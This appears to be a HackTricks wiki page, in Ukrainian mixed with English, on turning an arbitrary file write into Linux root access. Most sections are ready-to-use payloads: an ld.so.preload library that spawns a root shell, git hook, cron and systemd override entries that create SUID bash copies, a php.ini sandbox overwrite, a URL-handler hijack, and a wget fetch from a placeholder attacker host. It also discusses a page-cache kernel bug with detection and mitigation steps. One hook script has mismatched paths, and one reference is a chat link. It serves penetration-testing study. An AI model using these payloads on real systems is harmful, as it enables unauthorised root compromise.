# Довільний запис файлу від root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Цей файл поводиться як змінна середовища **`LD_PRELOAD`**, але також працює в **SUID binaries**.\
Якщо ви можете створити його або змінити, ви можете просто додати **path до бібліотеки, яка буде завантажуватися** з кожним виконуваним binary.

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **скрипти**, які **запускаються** на різних **подіях** у git repository, наприклад, коли створюється commit, merge... Тому якщо **privileged script або user** часто виконує ці дії, і є можливість **писати в папку `.git`**, це можна використати для **privesc**.

Наприклад, можна **згенерувати скрипт** у git repo в **`.git/hooks`**, щоб він завжди виконувався, коли створюється новий commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

If you can **write cron-related files that root executes**, you can usually get code execution the next time the job runs. Interesting targets include:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати нове root cron job** до `/etc/crontab` або файла в `/etc/cron.d/`
- **Замінити script**, який already виконується `run-parts`
- **Backdoor existing timer target** шляхом зміни script або binary, який він запускає

Minimal cron payload example:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете писати лише всередину cron directory, який використовується `run-parts`, натомість додайте туди executable file:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` зазвичай ігнорує імена файлів, що містять крапки, тож краще використовувати назви на кшталт `backup` замість `backup.sh`.
- Деякі дистрибутиви використовують `anacron` або `systemd` timers замість класичного cron, але ідея abuse та сама: **modify what root will execute later**.

### Service & Socket files

If you can write **`systemd` unit files** or files referenced by them, you may be able to get code execution as root by reloading and restarting the unit, or by waiting for the service/socket activation path to trigger.

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Поширені шляхи зловживання:

- **Перезаписати `ExecStart=`** у service unit, що належить root, який ви можете змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спочатку очистити старий
- **Backdoor**-нути script/binary, на який уже посилається unit
- **Hijack**-нути socket-activated service, змінивши відповідний `.service` file, який запускається, коли socket отримує connection

Приклад шкідливого override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий потік активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Якщо ви не можете перезапустити services самостійно, але можете редагувати unit, який активується через socket, вам може знадобитися лише **дочекатися підключення client**, щоб запустити backdoored service як root.

### Перезаписати обмежувальний `php.ini`, який використовується привілейованим PHP sandbox

Деякі custom daemons валідовують PHP, наданий user, запускаючи `php` з **restricted `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox усе ще має **будь-яку write primitive** (наприклад, `file_put_contents`) і ви можете дістатися **точного шляху до `php.ini`**, який використовує daemon, ви можете **перезаписати цю config**, щоб зняти обмеження, а потім надіслати другий payload, який виконається з elevated privileges.

Типовий flow:

1. Перший payload перезаписує sandbox config.
2. Другий payload виконує code після того, як небезпечні functions знову увімкнено.

Мінімальний приклад (замініть path, який використовує daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Якщо daemon працює як root (або перевіряє через paths, що належать root), другий execution дає root context. По суті, це **privilege escalation via config overwrite** тоді, коли sandboxed runtime все ще може записувати файли.

### binfmt_misc

Файл, розташований у `/proc/sys/fs/binfmt_misc`, вказує, який binary має execute який тип файлів. TODO: перевірити requirements, щоб abuse цього для запуску rev shell, коли відкривається common file type.

### Overwrite schema handlers (like http: or https:)

Attacker з permissions на запис у configuration directories жертви може легко replace або create файли, що змінюють system behavior, resulting in unintended code execution. Modifying файл `$HOME/.config/mimeapps.list`, щоб вказати HTTP і HTTPS URL handlers на malicious file (e.g., встановивши `x-scheme-handler/http=evil.desktop`), attacker ensures that **clicking any http or https link triggers code specified in that `evil.desktop` file**. For example, after placing the following malicious code in `evil.desktop` у `$HOME/.local/share/applications`, any external URL click runs the embedded command:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root executing user-writable scripts/binaries

If a privileged workflow runs something like `/bin/sh /home/username/.../script` (or any binary inside a directory owned by an unprivileged user), you can hijack it:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте writeability:** переконайтеся, що і цільовий файл, і його директорія належать вашому користувачу та є writable.
- **Hijack the target:** зробіть backup оригінального binary/script і розмістіть payload, який створює SUID shell (або виконує будь-яку іншу root дію), потім відновіть permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Спробуйте виконати привілейовану дію** (наприклад, натиснути кнопку UI, яка запускає helper). Коли root повторно виконає hijacked шлях, отримаєте escalated shell за допомогою `./rootshell -p`.

### Page-cache-only file modification of privileged binaries

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дозволяють змінювати лише копію **page cache** для readable файла. Якщо можна націлити **setuid** або інший **root-executed** binary, наступне виконання може запустити bytes, контрольовані attacker, просто з memory, і підвищити privileges, навіть якщо file hash на диску не змінився.

Це корисно розглядати як **runtime-only file write primitive**:

- **Disk stays clean**: inode і on-disk bytes не змінюються
- **Memory is dirty**: processes, що читають/виконують cached page, отримують modified content від attacker
- **Effect is temporary**: зміна зникає після reboot або eviction cache

Ця primitive знаходиться між класичним **arbitrary file write** і старішими bugs **page-cache abuse**, такими як Dirty COW / Dirty Pipe:

- Dirty COW покладався на race
- Dirty Pipe мав обмеження щодо write-position
- Page-cache-only primitive може бути надійнішою, якщо vulnerable path дає прямі writes у cached file-backed pages

#### Generic privesc flow

1. Отримайте kernel primitive, який може писати в **file-backed page cache pages**
2. Використайте її проти **readable privileged binary** або іншого root-executed файла
3. Запустіть execution **до того**, як page буде evicted з cache
4. Отримайте code execution як root, поки on-disk файл все ще виглядає unmodified

Типові high-value targets:

- **setuid-root** binaries
- Helpers, запущені **root services**
- Binaries, які часто запускаються з **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) — хороший приклад цього класу. Vulnerable path був у Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` може переміщувати references на page-cache pages з readable файла до crypto TX scatterlist
- in-place `algif_aead` decrypt path повторно використовував source і destination buffers
- `authencesn` тоді записував у destination tag region
- коли ця область усе ще посилалася на spliced file-backed pages, write потрапляв у **page cache цільового файла**

Отже, цікава technique — не сам CVE, а pattern:

- **feed file-backed cache pages into a kernel subsystem**
- змусити subsystem **вважати їх writable output**
- запустити невеликий керований overwrite у memory

Public PoC використовував повторні **4-byte writes** для patch `/usr/bin/su` in memory, а потім виконував його.

#### Exposure and hunting

Якщо ви підозрюєте цей клас bug, не покладайтеся лише на disk integrity checks. Також перевірте:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` може завантажуватися/вивантажуватися як модуль
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у kernel
- setuid binaries — хороші цілі, тому що patch лише для page-cache може бути достатнім, щоб перетворити local foothold на root

#### Зменшення attack-surface для шляху `algif_aead`

Якщо вразливий інтерфейс надається loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Якщо це скомпільовано в kernel, деякі disclosures повідомляли про blocking init path за допомогою:
```bash
initcall_blacklist=algif_aead_init
```
Такий тип mitigation варто пам’ятати й для інших kernel LPE: якщо exploitation залежить від конкретного optional interface, disabling або blacklisting цього interface може зламати exploit path ще до того, як стане доступне повне kernel upgrade.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
